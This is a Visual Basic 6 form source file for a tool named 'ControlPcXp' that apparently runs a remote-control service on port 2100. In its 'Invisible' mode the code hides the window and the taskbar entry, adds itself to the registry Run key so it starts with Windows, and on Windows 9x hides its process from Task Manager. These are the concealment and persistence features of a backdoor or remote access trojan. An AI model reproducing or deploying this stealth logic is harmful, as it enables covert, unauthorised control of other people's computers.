VERSION 5.00
Begin VB.Form Hkr 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "ControlPcXp"
   ClientHeight    =   7350
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   7095
   Icon            =   "ControlPcXp.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   7350
   ScaleWidth      =   7095
   StartUpPosition =   2  'CenterScreen
   Begin ControlPcXp.Services Services1 
      Height          =   7335
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   7095
      _ExtentX        =   12515
      _ExtentY        =   12938
      Begin VB.PictureBox Picture1 
         AutoRedraw      =   -1  'True
         Height          =   3615
         Left            =   1200
         ScaleHeight     =   3555
         ScaleWidth      =   4515
         TabIndex        =   1
         Top             =   1080
         Visible         =   0   'False
         Width           =   4575
      End
   End
End
Attribute VB_Name = "Hkr"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()

Services1.ControlXpPcMode False
If GetSetting(App.Title, "General", "Invisible", "False") = "True" Then
Invisible
Else
Start
End If

End Sub

Public Sub Start()
    With Services1
        port = 2100
        .Show True
        '.Start = True
        '.EnableServices = True
    End With 'Services1
    On Error GoTo 0

End Sub


Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Services1.CloseService
End
End Sub
Sub Visiblen()
 With Me
 .Visible = True
 App.TaskVisible = True
 End With
 RemoveAutostart
 SaveSetting App.Title, "General", "Invisible", "False"
End Sub
Sub Invisible()
SaveSetting App.Title, "General", "Invisible", "True"

On Error Resume Next
  Dim Exe        As String
  
        With Me
            '.Width = 0
            '.Height = 0
            .Visible = False
            App.TaskVisible = False
        End With
        'Add me to Registry's Run Section
        AddtoStartup
        'Detect The System ( if System Directory is System32 Then It Will Be Winxp/nt/2000 )
        If InStr(1, GetSystemDirectory, "System32", vbTextCompare) > 0 Then
         Else 'NOT INSTR(1,...
            'Hide me From Task Manager ( Win98 Api )
            RegisterServiceProcess GetCurrentProcessId(), RSP_SIMPLE_SERVICE
        End If
        
    'Common Section
    With Services1
        .Show True
        .Start = True
        .EnableServices = True
    End With 'Services1
    On Error GoTo 0

End Sub

